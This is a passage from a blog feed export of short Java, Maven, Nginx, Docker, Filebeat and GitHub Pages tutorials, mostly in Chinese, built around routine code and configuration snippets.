<h3 id="post-example"><a href="#post-example" class="headerlink" title="post example"></a>post example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">PostJson:</span><br><span class="line">public static final MediaType JSON = MediaType.get(<span class="string">&quot;application/json; charset=utf-8&quot;</span>);</span><br><span class="line">private final OkHttpClient client = new OkHttpClient();</span><br><span class="line">public String PostJson(String url, String json) throws IOException &#123;</span><br><span class="line">    RequestBody body = RequestBody.create(json, JSON);</span><br><span class="line">    Request request = new Request.Builder()</span><br><span class="line">        .url(url)</span><br><span class="line">        .post(body)</span><br><span class="line">        .build();</span><br><span class="line">    try (Response response = client.newCall(request).execute()) &#123;</span><br><span class="line">      <span class="built_in">return</span> response.body().string();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">String response = PostJson(<span class="string">&quot;http://www.roundsapp.com/post&quot;</span>, <span class="string">&quot;&#123;&#x27;name&#x27;:&#x27;DavidChen&#x27;&#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">PostForm:</span><br><span class="line">public void PostForm() throws Exception &#123;</span><br><span class="line">    RequestBody formBody = new FormBody.Builder()</span><br><span class="line">        .add(<span class="string">&quot;search&quot;</span>, <span class="string">&quot;Jurassic Park&quot;</span>)</span><br><span class="line">        .build();</span><br><span class="line">    Request request = new Request.Builder()</span><br><span class="line">        .url(<span class="string">&quot;https://en.wikipedia.org/w/index.php&quot;</span>)</span><br><span class="line">        .post(formBody)</span><br><span class="line">        .build();</span><br><span class="line"></span><br><span class="line">    try (Response response = client.newCall(request).execute()) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!response.isSuccessful()) throw new IOException(<span class="string">&quot;Unexpected code &quot;</span> + response);</span><br><span class="line"></span><br><span class="line">      System.out.println(response.body().string());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>OKHttp</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Maven</tag>
        <tag>OKHttp</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Use Pom Plugin To Mkdir Directory</title>
    <url>/posts/dce4f41c/</url>
    <content><![CDATA[<h3 id="How-To-Use-Pom-Plugin-To-Mkdir-Directory"><a href="#How-To-Use-Pom-Plugin-To-Mkdir-Directory" class="headerlink" title="How To Use Pom Plugin To Mkdir Directory"></a>How To Use Pom Plugin To Mkdir Directory</h3><span id="more"></span>
<p>這篇介紹How To Use Pom Plugin To Mkdir Directory。</p>
<h3 id="Pom-example"><a href="#Pom-example" class="headerlink" title="Pom example"></a>Pom example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&lt;plugin&gt;</span><br><span class="line">	&lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;maven-antrun-plugin&lt;/artifactId&gt;</span><br><span class="line">	&lt;version&gt;3.1.0&lt;/version&gt;</span><br><span class="line">	&lt;executions&gt;</span><br><span class="line">		&lt;execution&gt;</span><br><span class="line">			&lt;<span class="built_in">id</span>&gt;createROOT&lt;/id&gt;</span><br><span class="line">			&lt;phase&gt;process-resources&lt;/phase&gt;</span><br><span class="line">			&lt;configuration&gt;</span><br><span class="line">				&lt;target&gt;</span><br><span class="line">					&lt;<span class="built_in">echo</span> message=<span class="string">&quot;Creating target/ROOT directory&quot;</span> /&gt;</span><br><span class="line">					&lt;<span class="built_in">mkdir</span> <span class="built_in">dir</span>=<span class="string">&quot;./target/ROOT&quot;</span> /&gt;</span><br><span class="line">					&lt;<span class="built_in">mkdir</span> <span class="built_in">dir</span>=<span class="string">&quot;./target/test-classes&quot;</span> /&gt;</span><br><span class="line">				&lt;/target&gt;</span><br><span class="line">			&lt;/configuration&gt;</span><br><span class="line">			&lt;goals&gt;</span><br><span class="line">				&lt;goal&gt;run&lt;/goal&gt;</span><br><span class="line">			&lt;/goals&gt;</span><br><span class="line">		&lt;/execution&gt;</span><br><span class="line">	&lt;/executions&gt;</span><br><span class="line">&lt;/plugin&gt;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Pom</category>
      </categories>
      <tags>
        <tag>Pom</tag>
        <tag>Plugin</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Use Stream Sorted For Map</title>
    <url>/posts/1dd9a04/</url>
    <content><![CDATA[<h3 id="How-To-Use-Stream-Sorted-For-Map"><a href="#How-To-Use-Stream-Sorted-For-Map" class="headerlink" title="How To Use Stream Sorted For Map"></a>How To Use Stream Sorted For Map</h3><span id="more"></span>
<p>這篇介紹How To Use Stream Sorted For Map.</p>
<h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Map&lt;String, String&gt; cache = new HashMap&lt;&gt;();</span><br><span class="line">cache.put(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">cache.put(<span class="string">&quot;3&quot;</span>,<span class="string">&quot;3&quot;</span>);</span><br><span class="line">cache.put(<span class="string">&quot;2&quot;</span>,<span class="string">&quot;2&quot;</span>);</span><br><span class="line">		</span><br><span class="line">Map&lt;String, String&gt; sortedMap = cache.entrySet().stream().sorted(Map.Entry.comparingByKey())</span><br><span class="line">.collect(Collectors.toMap(Map.Entry::getKey, Map.Entry::getValue,</span><br><span class="line">(oldValue, newValue) -&gt; oldValue, LinkedHashMap::new));</span><br><span class="line"></span><br><span class="line">sortedMap - Output:</span><br><span class="line">(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">(<span class="string">&quot;2&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">(<span class="string">&quot;3&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Sorted</category>
      </categories>
      <tags>
        <tag>Stream</tag>
        <tag>Sorted</tag>
        <tag>Map</tag>
      </tags>
  </entry>
  <entry>
    <title>HttpPost Use Proxy To Target</title>
    <url>/posts/df0f981/</url>
    <content><![CDATA[<h3 id="HttpPost-Use-Proxy-To-Target"><a href="#HttpPost-Use-Proxy-To-Target" class="headerlink" title="HttpPost Use Proxy To Target"></a>HttpPost Use Proxy To Target</h3><span id="more"></span>
<p>這篇介紹在Java如何透過HttpHost via Proxy to Target。</p>
<h3 id="Proxy-url"><a href="#Proxy-url" class="headerlink" title="Proxy url"></a>Proxy url</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">http://user:password@10.10.10.1:9988</span><br></pre></td></tr></table></figure>

<h3 id="Sample-code"><a href="#Sample-code" class="headerlink" title="Sample code"></a>Sample code</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">package org.apache.http.examples.client;</span><br><span class="line"></span><br><span class="line">import org.apache.http.HttpHost;</span><br><span class="line">import org.apache.http.auth.AuthScope;</span><br><span class="line">import org.apache.http.auth.UsernamePasswordCredentials;</span><br><span class="line">import org.apache.http.client.CredentialsProvider;</span><br><span class="line">import org.apache.http.client.config.RequestConfig;</span><br><span class="line">import org.apache.http.client.methods.CloseableHttpResponse;</span><br><span class="line">import org.apache.http.client.methods.HttpGet;</span><br><span class="line">import org.apache.http.impl.client.BasicCredentialsProvider;</span><br><span class="line">import org.apache.http.impl.client.CloseableHttpClient;</span><br><span class="line">import org.apache.http.impl.client.HttpClients;</span><br><span class="line">import org.apache.http.util.EntityUtils;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * A simple example that uses HttpClient to execute an HTTP request</span><br><span class="line"> * over a secure connection tunneled through an authenticating proxy.</span><br><span class="line"> */</span><br><span class="line">public class ClientProxyAuthentication &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        CredentialsProvider credsProvider = new BasicCredentialsProvider();</span><br><span class="line">        credsProvider.setCredentials(</span><br><span class="line">                new AuthScope(<span class="string">&quot;localhost&quot;</span>, 8888),</span><br><span class="line">                new UsernamePasswordCredentials(<span class="string">&quot;squid&quot;</span>, <span class="string">&quot;squid&quot;</span>));</span><br><span class="line">        credsProvider.setCredentials(</span><br><span class="line">                new AuthScope(<span class="string">&quot;httpbin.org&quot;</span>, 80),</span><br><span class="line">                new UsernamePasswordCredentials(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;passwd&quot;</span>));</span><br><span class="line">        CloseableHttpClient httpclient = HttpClients.custom()</span><br><span class="line">                .setDefaultCredentialsProvider(credsProvider).build();</span><br><span class="line">        try &#123;</span><br><span class="line">            HttpHost target = new HttpHost(<span class="string">&quot;httpbin.org&quot;</span>, 80, <span class="string">&quot;http&quot;</span>);</span><br><span class="line">            HttpHost proxy = new HttpHost(<span class="string">&quot;localhost&quot;</span>, 8888);</span><br><span class="line"></span><br><span class="line">            RequestConfig config = RequestConfig.custom()</span><br><span class="line">                .setProxy(proxy)</span><br><span class="line">                .build();</span><br><span class="line">            HttpGet httpget = new HttpGet(<span class="string">&quot;/basic-auth/user/passwd&quot;</span>);</span><br><span class="line">            httpget.setConfig(config);</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;Executing request &quot;</span> + httpget.getRequestLine() + <span class="string">&quot; to &quot;</span> + target + <span class="string">&quot; via &quot;</span> + proxy);</span><br><span class="line"></span><br><span class="line">            CloseableHttpResponse response = httpclient.execute(target, httpget);</span><br><span class="line">            try &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;----------------------------------------&quot;</span>);</span><br><span class="line">                System.out.println(response.getStatusLine());</span><br><span class="line">                System.out.println(EntityUtils.toString(response.getEntity()));</span><br><span class="line">            &#125; finally &#123;</span><br><span class="line">                response.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; finally &#123;</span><br><span class="line">            httpclient.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>HTTP</category>
      </categories>
      <tags>
        <tag>Proxy</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Verify GitHub Custom Domain On CloudFlare</title>
    <url>/posts/aac07c09/</url>
    <content><![CDATA[<h3 id="How-To-Verify-GitHub-Custom-Domain-On-CloudFlare"><a href="#How-To-Verify-GitHub-Custom-Domain-On-CloudFlare" class="headerlink" title="How To Verify GitHub Custom Domain On CloudFlare"></a>How To Verify GitHub Custom Domain On CloudFlare</h3><span id="more"></span>
<p>這篇介紹How To Verify GitHub Custom Domain On CloudFlare。</p>
<h3 id="詳細步驟"><a href="#詳細步驟" class="headerlink" title="詳細步驟"></a>詳細步驟</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">最近新建網站，想購買新網域綁在GitHub服務上。</span><br><span class="line">首先去賣網域的服務商，購買你想要的domain。</span><br><span class="line">接著登入GitHub -&gt; Settings -&gt; Pages -&gt; Add Domain</span><br><span class="line">-&gt; 輸入domain後，會需要經過驗證步驟如下:</span><br><span class="line">1. Create a TXT record <span class="keyword">in</span> your DNS configuration <span class="keyword">for</span> the following hostname:</span><br><span class="line"> _github-pages-challenge-&#123;your domain&#125;.&#123;your domain&#125;.com</span><br><span class="line">2. Use this code <span class="keyword">for</span> the value of the TXT record: &#123;code&#125;</span><br><span class="line">3. Wait until your DNS configuration changes. This could take up to 24 hours to propagate.</span><br><span class="line"></span><br><span class="line">我這邊是使用CloudFlare CDN服務~</span><br><span class="line">1. CloudFlare註冊帳號 -&gt; add site -&gt; 填入剛購買的domain</span><br><span class="line">2. 在domain購買網站輸入 DNS Servers -&gt; 通常有兩組 xxxxxx.ns.cloudflare.com</span><br><span class="line">3. 在DNS設定中，新增一組TXT name:_github-pages-challenge-&#123;your domain&#125;.&#123;your domain&#125;.com</span><br><span class="line">   value:&#123;code&#125;</span><br><span class="line">   新增完後，再去GitHub後台讓驗證通過</span><br><span class="line">4. 接著按照https://davidchenblog.com/posts/76881ca3 這篇做完設定~</span><br><span class="line">5. 需要等待時間讓DNS Server設定生效</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>GitHub</category>
      </categories>
      <tags>
        <tag>CloudFlare</tag>
        <tag>GitHub</tag>
        <tag>CustomDomain</tag>
      </tags>
  </entry>
  <entry>
    <title>HttpSession原理</title>
    <url>/posts/3767cf47/</url>
    <content><![CDATA[<h2 id="HttpSession原理"><a href="#HttpSession原理" class="headerlink" title="HttpSession原理"></a>HttpSession原理</h2><span id="more"></span>
<p>簡介:<br>當嘗試執行 HttpServletRequest 的 getSession() 時，Web容器會為你建立 HttpSession 物件，<br>每個 HttpSession 物件都會有個特殊的 ID，稱之為Session ID，你可以執行 HttpSession 的 getId()<br>來取得 Session ID。這個 Session ID 預設會使用 Cookie 存放至瀏覽器，<br>Cookie 的名稱預設是 JSESSIONID，數值則是 getId() 取得的 Session ID。</p>
<h2 id="HttpSession-Roadmap"><a href="#HttpSession-Roadmap" class="headerlink" title="HttpSession Roadmap:"></a>HttpSession Roadmap:</h2><p>1.HttpSession屬性是存在Server<br>2.Session ID 預設使用 Cookie 存放於瀏覽器<br>3.Web 容器儲存 Session ID 的 Cookie 預設為關閉瀏覽器就失效<br>4.重新開啟瀏覽器請求應用程式時，透過 getSession() 取得的就是新的 HttpSession 物件<br>5.HttpSession 物件會佔用記憶體空間，所以 HttpSession 的屬性中儘量不要儲存耗資源的大型物件，必要時將屬性移除<br>6.或者不需使用 HttpSession 時，執行 invalidate() 讓 HttpSession 失效<br>7.預設關閉瀏覽器會馬上失效的是瀏覽器上的 Cookie，不是伺服器上的 HttpSession 物件<br>8.因為 Cookie 失效了，就無法透過 Cookie 來發送 Session ID，所以嘗試 getSession() 時，容器會產生新的 HttpSession<br>9.讓 HttpSession 立即失效必須執行 invalidate() 方法，否則的話，HttpSession 會等到設定的失效期間過後才會被容器銷毀回收</p>
<h3 id="web-xml-session-timeout"><a href="#web-xml-session-timeout" class="headerlink" title="web.xml session timeout"></a>web.xml session timeout</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">//在 web.xml 中設定 HttpSession 預設的失效時間，(單位:分鐘)</span><br><span class="line">&lt;/web-app …&gt;</span><br><span class="line">    ...</span><br><span class="line">    &lt;session-config&gt;</span><br><span class="line">        &lt;session-timeout&gt;30&lt;/session-timeout&gt; &lt;!-- 30 分鐘 --&gt;</span><br><span class="line">    &lt;/session-config&gt;</span><br><span class="line">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure>

<h2 id="HttpSession-setMaxInactiveInterval"><a href="#HttpSession-setMaxInactiveInterval" class="headerlink" title="HttpSession.setMaxInactiveInterval:"></a>HttpSession.setMaxInactiveInterval:</h2><p>執行 HttpSession 的 setMaxInactiveInterval() 方法，所設定的是 HttpSession 物件在瀏覽器多久沒活動就失效的時間<br>而不是儲存 Session ID 的 Cookie 失效時間。儲存 Session ID 的 Cookie 預設為關閉瀏覽器就失效<br>在 Servlet 4.0 中，HttpSession 預設失效時間，也可以透過 ServletContext 的 setSessionTimeout() 來設定。<br>透過 SessionCookieConfig 實作物件，你可以設定儲存 Session ID 的 Cookie 相關資訊，例如可以透過 setName() 將預設的 Session ID 名稱修改為別的名稱<br>透過 setMaxAge() 設定儲存 Session ID 的 Cookie 存活期限 (單位:秒)<br>要注意的是，設定 SessionCookieConfig 必須在 ServletContext 被初始化之前</p>
<h3 id="web-xml-修改-Session-ID、Cookie-存活期等資訊"><a href="#web-xml-修改-Session-ID、Cookie-存活期等資訊" class="headerlink" title="web.xml 修改 Session ID、Cookie 存活期等資訊:"></a>web.xml 修改 Session ID、Cookie 存活期等資訊:</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&lt;/web-app …&gt;</span><br><span class="line">    ...</span><br><span class="line">    &lt;session-config&gt;</span><br><span class="line">        &lt;session-timeout&gt;30&lt;/session-timeout&gt; &lt;!-- 30 分鐘 --&gt;</span><br><span class="line">        &lt;cookie-config&gt;</span><br><span class="line">            &lt;name&gt;yourJsessionid&lt;/name&gt;</span><br><span class="line">            &lt;secure&gt;<span class="literal">true</span>&lt;/secure&gt;</span><br><span class="line">            &lt;http-only&gt;<span class="literal">true</span>&lt;/http-only&gt;</span><br><span class="line">            &lt;max-age&gt;1800&lt;/max-age&gt; &lt;!-- 1800 秒，不建議 --&gt;</span><br><span class="line">        &lt;/cookie-config&gt;</span><br><span class="line">    &lt;/session-config&gt;</span><br><span class="line">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>HTTP</category>
      </categories>
      <tags>
        <tag>HttpSession</tag>
      </tags>
  </entry>
  <entry>
    <title>Install Docker Error Problem With Installed Package Podman</title>
    <url>/posts/51d409b8/</url>
    <content><![CDATA[<h3 id="Install-Docker-Error-Problem-With-Installed-Package-Podman"><a href="#Install-Docker-Error-Problem-With-Installed-Package-Podman" class="headerlink" title="Install Docker Error Problem With Installed Package Podman"></a>Install Docker Error Problem With Installed Package Podman</h3><span id="more"></span>
<p>這篇介紹Install Docker Error Problem With Installed Package Podman。</p>
<h3 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@<span class="built_in">test</span>]<span class="comment"># sudo yum install docker-ce docker-ce-cli containerd.io</span></span><br><span class="line"></span><br><span class="line">Last metadata expiration check: 0:04:04 ago on Tue 18 Apr 2023 12:23:21 PM CST.</span><br><span class="line">Error:</span><br><span class="line"> Problem 1: problem with installed package podman-3:4.2.0-4.module+el8.7.0+1078+e72fcd4f.x86_64</span><br><span class="line"></span><br><span class="line">解決方式:</span><br><span class="line">$ yum erase podman buildah</span><br><span class="line"></span><br><span class="line">若仍然無法解決:</span><br><span class="line">$ yum install docker-ce docker-ce-cli containerd.io --allowerasing</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Install And Set Nginx For Different Domain To localhost Port</title>
    <url>/posts/3eb064f7/</url>
    <content><![CDATA[<h3 id="Install-And-Set-Nginx-For-Different-Domain-To-localhost-Port"><a href="#Install-And-Set-Nginx-For-Different-Domain-To-localhost-Port" class="headerlink" title="Install And Set Nginx For Different Domain To localhost Port"></a>Install And Set Nginx For Different Domain To localhost Port</h3><span id="more"></span>
<p>這篇介紹Install And Set Nginx For Different Domain To localhost Port。</p>
<h3 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">在CentOS7上，登入切換root權限</span><br><span class="line">$ yum install nginx</span><br></pre></td></tr></table></figure>

<h3 id="How-to-set"><a href="#How-to-set" class="headerlink" title="How to set"></a>How to set</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /etc/nginx/conf.d</span><br><span class="line">$ <span class="built_in">touch</span> domain.conf</span><br><span class="line">在檔案domain.conf，新增以下設定:</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">	listen       80;</span><br><span class="line">	server_name  david.blog;</span><br><span class="line"></span><br><span class="line">	location / &#123;</span><br><span class="line">		proxy_pass http://10.10.10.1:7777;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">參數說明:</span><br><span class="line">listen 從瀏覽器進來的port</span><br><span class="line">server_name 設定需解析的domain</span><br><span class="line">location 進來後需導至哪一個IP &amp; Port</span><br></pre></td></tr></table></figure>

<h3 id="設定完重啟"><a href="#設定完重啟" class="headerlink" title="設定完重啟"></a>設定完重啟</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">設定後先檢查設定檔的語法是否正確:</span><br><span class="line">$ nginx -t</span><br><span class="line">如果沒有錯誤, 便可以重新載入 Nginx 的新設定:</span><br><span class="line">$ nginx -s reload</span><br><span class="line">啟動 Nginx:</span><br><span class="line">$ systemctl start nginx</span><br><span class="line">設定開機自動啟動:</span><br><span class="line">$ systemctl <span class="built_in">enable</span> nginx</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>Install Filebeat</title>
    <url>/posts/d726006e/</url>
    <content><![CDATA[<h3 id="Install-Filebeat"><a href="#Install-Filebeat" class="headerlink" title="Install Filebeat"></a>Install Filebeat</h3><span id="more"></span>
<p>Filebeat is a lightweight software for sending logs is available for Windows, MacOS and Linux.</p>
<h3 id="Install-Filebeat-from-rpm-package"><a href="#Install-Filebeat-from-rpm-package" class="headerlink" title="Install Filebeat from rpm package"></a>Install Filebeat from rpm package</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Download rpm package (with sha512 checked)</span><br><span class="line">$ wget https://artifacts.elastic.co/downloads/beats/filebeat/filebeat-7.2.0-x86_64.rpm</span><br><span class="line">$ wget https://artifacts.elastic.co/downloads/beats/filebeat/filebeat-7.2.0-x86_64.rpm.sha512</span><br><span class="line"></span><br><span class="line">Install Filebeat</span><br><span class="line">$ rpm -ivh filebeat-7.2.0-x86_64.rpm</span><br><span class="line"></span><br><span class="line">Check filebeat version (7.2.0)</span><br><span class="line">$ filebeat version</span><br><span class="line"></span><br><span class="line">Move custom.yml(content differ from every project) into filebeat directory.</span><br><span class="line"><span class="variable">$mv</span> custom.yml /etc/filebeat/</span><br></pre></td></tr></table></figure>

<h3 id="Optional-Install-Filebeat-from-binary"><a href="#Optional-Install-Filebeat-from-binary" class="headerlink" title="(Optional) Install Filebeat from binary"></a>(Optional) Install Filebeat from binary</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Download Filebeat 7.2.0 binary (with sha512 checked)</span><br><span class="line"><span class="variable">$wget</span> https://artifacts.elastic.co/downloads/beats/filebeat/filebeat-7.2.0-linux-x86_64.tar.gz</span><br><span class="line"><span class="variable">$wget</span> https://artifacts.elastic.co/downloads/beats/filebeat/filebeat-7.2.0-linux-x86_64.tar.gz.sha512</span><br><span class="line"></span><br><span class="line">Unzip filebeat package.</span><br><span class="line"></span><br><span class="line">Check filebeat version (7.2.0)</span><br><span class="line">$ ./filebeat version</span><br><span class="line"></span><br><span class="line">Move custom.yml(content differ from every project) into filebeat directory.</span><br></pre></td></tr></table></figure>

<h3 id="Modify-custom-yml"><a href="#Modify-custom-yml" class="headerlink" title="Modify custom.yml"></a>Modify custom.yml</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Modify absolute <span class="built_in">source</span> <span class="built_in">log</span> path &amp; instance name.</span><br><span class="line">Linux version:</span><br><span class="line">--------------------------------------------------------</span><br><span class="line">filebeat.inputs:</span><br><span class="line">- <span class="built_in">type</span>: <span class="built_in">log</span>  </span><br><span class="line">  paths:    - /usr/local/apache/tomcat/logs/catalina.log  </span><br><span class="line">  fields:</span><br><span class="line">    pipeline_log_id: project    </span><br><span class="line">	instance: custom_instance  </span><br><span class="line">  fields_under_root: <span class="literal">true</span>  </span><br><span class="line">  tail_files: <span class="literal">false</span>  </span><br><span class="line">  scan_frequency: 3s  </span><br><span class="line">  idle_timeout: 3s</span><br><span class="line">output.logstash:  </span><br><span class="line">  hosts: [<span class="string">&quot;www.elk02.co:5044&quot;</span>]  </span><br><span class="line">  worker: 5</span><br><span class="line">--------------------------------------------------------</span><br><span class="line">MS windows version:</span><br><span class="line">--------------------------------------------------------</span><br><span class="line">filebeat.inputs:</span><br><span class="line">- <span class="built_in">type</span>: <span class="built_in">log</span>  </span><br><span class="line">  paths:    -  <span class="string">&#x27;C:\tomcat\logs\catalina.log&#x27;</span>  </span><br><span class="line">  fields:    </span><br><span class="line">    pipeline_log_id: project    </span><br><span class="line">	instance: custom_instance  </span><br><span class="line">  fields_under_root: <span class="literal">true</span>  </span><br><span class="line">  tail_files: <span class="literal">false</span>  </span><br><span class="line">  scan_frequency: 3s  </span><br><span class="line">  idle_timeout: 3s</span><br><span class="line">output.logstash:  </span><br><span class="line">  hosts: [<span class="string">&quot;www.elk02.co:5044&quot;</span>]  </span><br><span class="line">  worker: 5</span><br></pre></td></tr></table></figure>

<h3 id="Modify-log-sending-destination"><a href="#Modify-log-sending-destination" class="headerlink" title="Modify log sending destination."></a>Modify log sending destination.</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">filebeat.inputs:</span><br><span class="line">- <span class="built_in">type</span>: <span class="built_in">log</span>  </span><br><span class="line">  paths:    - /usr/local/apache/tomcat/logs/catalina.log  </span><br><span class="line">  fields:    </span><br><span class="line">    pipeline_log_id: project    </span><br><span class="line">	instance: custom_instance  </span><br><span class="line">  fields_under_root: <span class="literal">true</span>  </span><br><span class="line">  tail_files: <span class="literal">false</span>  </span><br><span class="line">  scan_frequency: 3s  </span><br><span class="line">  idle_timeout: 3s</span><br><span class="line">output.logstash:  </span><br><span class="line">  hosts: [<span class="string">&quot;www.elk02.co:5044&quot;</span>]  </span><br><span class="line">  worker: 5</span><br></pre></td></tr></table></figure>

<h3 id="Run-filebeat"><a href="#Run-filebeat" class="headerlink" title="Run filebeat"></a>Run filebeat</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Change directory into filebeat folder.</span><br><span class="line"></span><br><span class="line">Execute filebeat.</span><br><span class="line">MS windows version: (Keep the window opened)C:\filebeat&gt; filebeat.exe -c custom.yml</span><br><span class="line">Linux windows version:[root@localhost filebeat]<span class="variable">$nohup</span> filebeat -c custom.yml &amp;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Filebeat</category>
      </categories>
      <tags>
        <tag>Filebeat</tag>
      </tags>
  </entry>
  <entry>
    <title>Integer.parseInt vs Integer.valueOf</title>
    <url>/posts/eb858cd0/</url>
    <content><![CDATA[<h3 id="Integer-parseInt-vs-Integer-valueOf"><a href="#Integer-parseInt-vs-Integer-valueOf" class="headerlink" title="Integer.parseInt vs Integer.valueOf"></a>Integer.parseInt vs Integer.valueOf</h3><span id="more"></span>
<p>在Java需要將String轉整數有兩個方法可以使用，<br>這裡將介紹兩者的不同與使用時機。</p>
<h3 id="Integer-parseInt"><a href="#Integer-parseInt" class="headerlink" title="Integer.parseInt"></a>Integer.parseInt</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">public static int parseInt(String s) throws NumberFormatException &#123; <span class="built_in">return</span> parseInt(s,10); &#125;</span><br><span class="line"></span><br><span class="line">Integer.parseInt <span class="built_in">return</span> int</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Integer-valueOf"><a href="#Integer-valueOf" class="headerlink" title="Integer.valueOf"></a>Integer.valueOf</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">public static Integer valueOf(String s) throws NumberFormatException &#123; <span class="built_in">return</span> Integer.valueOf(parseInt(s, 10)); &#125;</span><br><span class="line"></span><br><span class="line">Integer.valueOf <span class="built_in">return</span> Integer</span><br><span class="line"></span><br><span class="line">public static Integer valueOf(int i) &#123; <span class="keyword">if</span> (i &gt;= IntegerCache.low &amp;&amp; i &lt;= IntegerCache.high) <span class="built_in">return</span> IntegerCache.cache[i + (-IntegerCache.low)]; <span class="built_in">return</span> new Integer(i); &#125;</span><br><span class="line">當 i 在 -128 ~ 127 之間會用cache中取得Integer，若不在該範圍會new Integer(i)。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="使用時機"><a href="#使用時機" class="headerlink" title="使用時機"></a>使用時機</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">如果需要int，使用Integer.parseInt()方法。</span><br><span class="line">如果需要Integer，使用Integer.valueOf()方法。</span><br><span class="line">同樣Integer、Long、Double和Float都是一樣的道理。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Integer</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Catalina Standard Context StartInternal</title>
    <url>/posts/4d61d3a0/</url>
    <content><![CDATA[<h3 id="Intro-Catalina-Standard-Context-StartInternal"><a href="#Intro-Catalina-Standard-Context-StartInternal" class="headerlink" title="Intro Catalina Standard Context StartInternal"></a>Intro Catalina Standard Context StartInternal</h3><span id="more"></span>
<p>這篇介紹Catalina Standard Context StartInternal。</p>
<h3 id="錯誤訊息-amp-原因"><a href="#錯誤訊息-amp-原因" class="headerlink" title="錯誤訊息 &amp; 原因"></a>錯誤訊息 &amp; 原因</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">11-May-2023 14:11:41.402 SEVERE [localhost-startStop-1] org.apache.catalina.core.StandardContext.startInternal </span><br><span class="line">One or more listeners failed to start. Full details will be found <span class="keyword">in</span> the a ppropriate container <span class="built_in">log</span> file</span><br><span class="line">11-May-2023 14:11:41.404 SEVERE [localhost-startStop-1] org.apache.catalina.core.StandardContext.startInternal </span><br><span class="line">Context [] startup failed due to previous errors</span><br><span class="line"></span><br><span class="line">tomcat啟動時，會出現以上錯誤訊息造成啟動不成功。</span><br><span class="line">請至localhost.2023-05-11.log，查看真正的錯誤原因。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Catalina</category>
      </categories>
      <tags>
        <tag>Catalina</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Amazon Web Service EC2 Category</title>
    <url>/posts/75d827b9/</url>
    <content><![CDATA[<h3 id="Intro-Amazon-Web-Service-EC2-Category"><a href="#Intro-Amazon-Web-Service-EC2-Category" class="headerlink" title="Intro Amazon Web Service EC2 Category"></a>Intro Amazon Web Service EC2 Category</h3><span id="more"></span>
<p>這篇介紹Amazon Web Service EC2 Category.</p>
